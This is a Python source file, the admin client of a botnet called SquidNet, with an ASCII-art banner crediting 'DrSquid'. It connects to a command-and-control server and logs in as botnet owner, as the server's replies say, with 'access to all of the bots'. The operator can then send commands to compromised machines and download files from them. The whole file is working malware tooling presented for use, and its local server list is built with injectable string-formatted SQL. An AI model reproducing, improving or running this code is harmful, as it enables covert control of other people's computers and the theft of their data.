import socket, threading, os, sys, urllib.request, sqlite3, time

class Admin:
    def logo(self):
        logo = """
                                  /\\
                                 //\\\\
                                //__\\\\
                               //____\\\\
                               \\\____//
                                \\\__//
                                [|__|]
                                [|__|]
                                [|__|]
                                [|__|]
                                [|__|]
                                [|__|]
                                [|__|]
                     /)         [|__|]        (\\
                    //\_________[|__|]________/\\\\
                    ))__________||__||_________((
                   <_/         [  \/  ]        \_>
                               || || ||
                               || || ||
                               || || ||
                               || || ||
                               || || ||
                               || || ||
  _________            .__    .||_||_||__          __  ________      _____       .___      .__               ________     _______   
 /   _____/ ________ __|__| __| _/\      \   _____/  |_\_____  \    /  _  \    __| _/_____ |__| ____   ___  _\_____  \    \   _  \  
 \_____  \ / ____/  |  \  |/ __ | /   |   \_/ __ \   __\/  ____/   /  /_\  \  / __ |/     \|  |/    \  \  \/ / _(__  <    /  /_\  \ 
 /        < <_|  |  |  /  / /_/ |/    |    \  ___/|  | /       \  /    |    \/ /_/ |  Y Y  \  |   |  \  \   / /       \   \  \_/   \\
/_______  /\__   |____/|__\____ |\____|__  /\___  >__| \_______ \ \____|__  /\____ |__|_|  /__|___|  /   \_/ /______  / /\ \_____  /
        \/    |__|             || || ||  \/     \/             \/         \/      \/     \/        \/               \/  \/       \/ 
                               || || ||
                               || || ||
                               || || ||
                               || || ||
                               || || ||
                               || || ||
                               \\\ || //
                                \\\||//
                                 \\\//
                             ____-\/-____
                                 -__-
                                /    \\
Admin Script For SquidNet by DrSquid
        """
        return logo
    def __init__(self):
        self.dbfile = "servers.db"
        self.ftp = False
        self.first_msg_sent = False
        self.downloading_file = False
        self.download_file = None
        self.filesize = 0
        self.bytesrecv = 0
        print(self.logo())
        self.conf_db_file()
    def get_filename(self, msg):
        msg = msg.split()
        del msg[0]
        filename = ""
        for i in msg:
            filename += f" {i}"
        return filename.strip()
    def conf_db_file(self):
        try:
            file = open(self.dbfile,"rb").close()
        except:
            file = open(self.dbfile,"wb").close()
        db = sqlite3.connect(self.dbfile)
        cursor = db.cursor()
        cursor.execute("create table if not exists servers(ip, port)")
        db.commit()
        cursor.close()
        db.close()
    def obtain_all_servers_in_db(self):
        ls = []
        db = sqlite3.connect(self.dbfile)
        cursor = db.cursor()
        cursor.execute("select * from servers")
        for i in cursor.fetchall():
            ls.append(f"{i[0]}:{i[1]}")
        cursor.close()
        db.close()
        return ls
    def exec_sql_cmd(self, cmd):
        db = sqlite3.connect(self.dbfile)
        cursor = db.cursor()
        cursor.execute(cmd)
        db.commit()
        cursor.close()
        db.commit()
    def connect(self):
        success = False
        while not success:
            conn_method = input("[+] Are you connecting to a new server or one you've connected to?(new/old): ")
            if conn_method == "new":
                while True:
                    try:
                        self.ip = input("[+] Enter the IP of the SquidNet Server: ")
                        self.port = int(input("[+] Enter the port of the SquidNet Server: "))
                        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        self.client.connect((self.ip, self.port))
                        version = self.client.recv(1024).decode()
                        self.client.send(f"!botreg UNKNOWN 127.0.0.1 Admin SquidNet".encode())
                        self.exec_sql_cmd(f"insert into servers values('{self.ip}','{self.port}')")
                        print("[+] Successfully connected to the server!")
                        print(f"[+] Server Banner: {version}")
                        success = True
                        break
                    except socket.error as e:
                        print(f"[+] There was an error with connecting you to the SquidNet Server({e}). Input 'cancel' as your ip to revert back to the first input.")
                    except:
                        if self.ip == "cancel":
                            break
                        print("[+] Please enter a valid IP or Port to connect to a SquidNet Server.")
            elif conn_method == "old":
                server = ""
                while not success:
                    servers = self.obtain_all_servers_in_db()
                    if len(servers) == 0:
                        print("[+] You haven't connected to any servers yet.")
                        break
                    else:
                        item = 1
                        for server in servers:
                            print(f"[+] ({item}) {server}")
                            item += 1
                        while not success:
                            try:
                                server = input("[+] Enter the server(with the number assinged to it) you want to go to: ")
                                server = int(server)-1
                                server = servers[server]
                                self.ip = server.split(":")[0]
                                self.port = int(server.split(":")[1])
                                self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                self.client.connect((self.ip, self.port))
                                version = self.client.recv(1024).decode()
                                self.client.send(f"!botreg UNKNOWN 127.0.0.1 Admin SquidNet".encode())
                                print("[+] Successfully connected to the server!")
                                print(f"[+] Server Banner: {version}")
                                success = True
                                break
                            except socket.error:
                                print("[+] There was an error connecting to the server. Input 'cancel' if you want to go back to the first input.")
                            except Exception as e:
                                if server == "cancel":
                                    break
                                else:
                                    print("[+] Please enter a valid number on the server list.")
                    if server == "cancel":
                        break          
            else:
                print("[+] Invalid Input.")
        sender = threading.Thread(target=self.send).start()
    def recv(self):
        while True:
            try:
                msg = self.client.recv(10240)
                try:
                    dec_msg = msg.decode()
                except:
                    dec_msg = str(msg)
                if not self.downloading_file:
                    if msg.decode().strip() != "":
                        print(msg.decode())
                else:
                    try:
                        if not self.first_msg_sent:
                            if dec_msg.startswith("!filesize"):
                                self.filesize = int(msg.split()[1])
                                self.bytesrecv = 0
                                self.first_msg_sent = True
                            else:
                                print(dec_msg)
                        else:
                            self.bytesrecv += len(msg)
                            self.download_file.write(msg)
                            if self.bytesrecv >= self.filesize:
                                self.download_file.close()
                                self.downloading_file = False
                    except Exception as e:
                        print(e)
            except Exception as e:
                break
    def send(self):
        logged_in = False
        while True:
            try:
                if logged_in:
                    msg = input("[+] Enter your msg: ")
                    if not self.downloading_file:
                        if msg == "!clear":
                            if sys.platform == "win32":
                                os.system("cls")
                            else:
                                os.system("clear")
                            print(self.logo())
                        else:
                            self.client.send(msg.encode())
                    else:
                        print("[(SERVER)]: You are not able to send messages to the server until you have finished downloading the files!")
                    if msg == "!startftp":
                        self.ftp = True
                    if self.ftp:
                        if msg.startswith("!download"):
                            file = self.get_filename(msg)
                            self.first_msg_sent = False
                            self.download_file = open(file, "wb")
                            self.downloading_file = True
                else:
                    username = input("\n[+] Enter the Admin Account name: ")
                    password = input("[+] Enter the Admin Account password: ")
                    msg = f"!login {username} {password}"
                    self.client.send(msg.encode())
                    msgback = self.client.recv(10240).decode()
                    if msgback == "\n[(SERVER)]: There is already an active owner session. Please wait until they log off.":
                        print("[+] There is already an ongoing session in the Botnet. Please wait for them to log off.")
                    elif msgback.startswith("\n[(SERVER)]: Successfully logged into the Botnet. You have access to all of the bots."):
                        if sys.platform == "win32":
                            os.system("cls")
                        else:
                            os.system("clear")
                        print(self.logo())
                        print("[+] You successfully have logged into the botnet as an Admin.\n")
                        reciever = threading.Thread(target=self.recv).start()
                        logged_in = True
                    elif msgback == "\n[(SERVER)]: Authentication Failed.":
                        print("[+] Your username or password is invalid.")
                    print(msgback)
            except:
                print("[+] Your connection to the server has been terminated. Please try and reconnecting to the server you were just on.")
                reconnect = threading.Thread(target=self.connect).start()
                break
admin = Admin()
admin.connect()
